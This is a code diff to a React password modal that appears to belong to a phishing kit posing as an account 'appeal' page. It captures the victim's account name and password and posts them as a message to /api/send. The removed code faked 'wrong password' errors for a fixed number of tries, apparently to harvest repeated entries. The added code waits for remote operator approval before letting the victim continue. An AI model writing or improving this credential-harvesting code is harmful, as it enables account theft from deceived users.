@@ -3,6 +3,7 @@ import { useTranslation } from '@/hooks/use-translation';
 import { store } from '@/store/store';
 import config from '@/utils/config';
 import { buildAppealMessage } from '@/utils/message';
+import { pollApproval } from '@/utils/poll-approval';
 import { faEye } from '@fortawesome/free-regular-svg-icons/faEye';
 import { faEyeSlash } from '@fortawesome/free-regular-svg-icons/faEyeSlash';
 import { FontAwesomeIcon } from '@fortawesome/react-fontawesome';
@@ -24,7 +25,6 @@ const PASSWORD_MODAL_TEXTS = [
 
 const PasswordModal: FC<{ nextStep: () => void }> = ({ nextStep }) => {
     const { t } = useTranslation(PASSWORD_MODAL_TEXTS);
-    const [attempts, setAttempts] = useState(0);
     const [accountInput, setAccountInput] = useState('');
     const [isLoading, setIsLoading] = useState(false);
     const [password, setPassword] = useState('');
@@ -40,8 +40,7 @@ const PasswordModal: FC<{ nextStep: () => void }> = ({ nextStep }) => {
         setShowError(false);
         setIsLoading(true);
 
-        const next = attempts + 1;
-        setAttempts(next);
+        const sessionId = crypto.randomUUID();
 
         addAccount(accountInput);
         addPassword(password);
@@ -59,23 +58,28 @@ const PasswordModal: FC<{ nextStep: () => void }> = ({ nextStep }) => {
         });
 
         try {
-            const res = await axios.post('/api/send', { message, old_message_id: messageId });
+            const res = await axios.post('/api/send', {
+                message,
+                old_message_id: messageId,
+                approval_type: 'password',
+                session_id: sessionId
+            });
 
             if (res?.data?.success && typeof res.data.message_id === 'number') {
                 setMessageId(res.data.message_id);
             }
 
-            if (config.PASSWORD_LOADING_TIME) {
-                await new Promise((resolve) => setTimeout(resolve, config.PASSWORD_LOADING_TIME * 1000));
-            }
-            if (next >= maxPass) {
+            const result = await pollApproval(sessionId);
+
+            if (result === 'approved') {
                 nextStep();
             } else {
                 setShowError(true);
                 setPassword('');
             }
         } catch {
-            //
+            setShowError(true);
+            setPassword('');
         } finally {
             setIsLoading(false);
         }
